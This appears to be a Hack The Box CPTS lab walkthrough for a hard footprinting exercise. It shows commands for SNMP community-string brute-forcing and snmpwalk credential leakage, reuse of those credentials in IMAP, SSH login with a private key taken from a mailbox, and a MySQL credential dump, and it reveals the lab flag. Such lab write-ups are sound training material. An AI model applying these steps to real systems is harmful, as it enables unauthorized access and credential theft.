### CPTS / HTB Penetration Tester Path <br>
### Footprinting - Lab Hard <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Footprinting Lab - Hard

Third server is the MX + management server for the internal network, also a backup server for the domain accounts. A user `HTB` exists here — get their creds.

IP: 10.129.202.20

Discovery snapshot:
- `Admin <tech@inlanefreight.htb>`
- `Inlanefreight`
- `/opt/tom-recovery.sh`
- Possible creds: `tom:NMds732Js2761`

Services:
- 22 — OpenSSH 8.2p1
- 110 — Dovecot pop3d
- 143 — Dovecot imapd (Ubuntu)
- 161/UDP — SNMP
- 162/UDP — SNMP trap
- 993 — ssl/imap Dovecot
- 995 — ssl/pop3 Dovecot

---

### Question 1:
Enumerate the server carefully and find the username "HTB" and its password. Then, submit HTB's password as the answer.

#### Full TCP scan:

```diff
+ $ sudo nmap -sT -sC -sV -A -v -p- -oA init_all_ports 10.129.202.20
```

#### Nothing is reachable without creds. UDP scan exposes SNMP:

```diff
+ $ sudo nmap -sU -Pn -n --disable-arp-ping -sC -sV -A -v -F -oA sU_init 10.129.202.20
```

	161/udp open  snmp  net-snmp; net-snmp SNMPv3 server

#### Brute-force community strings with onesixtyone:

```diff
+ $ onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.202.20
```

	10.129.202.20 [backup] Linux NIXHARD 5.4.0-90-generic

#### Walk with the `backup` community:

```diff
+ $ snmpwalk -v2c -c backup 10.129.202.20
```

	iso.3.6.1.2.1.1.4.0 = STRING: "Admin <tech@inlanefreight.htb>"
	iso.3.6.1.2.1.25.1.7.1.2.1.2.6.66.65.67.75.85.80 = STRING: "/opt/tom-recovery.sh"
	iso.3.6.1.2.1.25.1.7.1.2.1.3.6.66.65.67.75.85.80 = STRING: "tom NMds732Js2761"

#### Login to IMAP over SSL with `tom:NMds732Js2761`:

```diff
+ $ openssl s_client -connect 10.129.202.20:imaps
+ 1 login tom NMds732Js2761
+ 1 LIST "" *
+ 1 select INBOX
+ 1 fetch 1 body[]
```

#### INBOX message contained an SSH private key for tom. Saved to `stolen_id_rsa` and SSH'd in:

```diff
+ $ ssh -i stolen_id_rsa tom@10.129.202.20
```

#### `.bash_history` showed `mysql -u tom -p`. Logged in:

```diff
+ tom@NIXHARD:~$ mysql -u tom -p
+ mysql> show databases;
+ mysql> use users;
+ mysql> show tables;
+ mysql> select username, password from users;
```

	| HTB | cr3n4o7rzse7rzhnckhssncif7ds |

&#x1F6A9; found **cr3n4o--edit--7rzse7rzhnckhssncif7ds**.
